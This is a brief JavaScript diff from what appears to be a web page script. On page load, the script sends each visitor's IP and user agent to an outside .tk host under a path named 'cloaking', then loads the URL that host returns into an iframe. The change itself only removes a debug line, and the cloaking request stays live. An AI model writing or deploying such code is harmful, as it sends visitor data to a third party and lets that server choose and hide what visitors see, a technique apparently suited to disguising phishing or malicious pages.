@@ -20,7 +20,6 @@ $( document ).ready(function() {
 	var ua = navigator.userAgent;	
 		$.get('https://ckargo.tk/cloaking/deneme.php?ip='+bidapatlat+'&ua='+ua, function(data) {
 			document.getElementById("framekontrol").src = data;
-			document.write(ua);
 			});
   })
 });
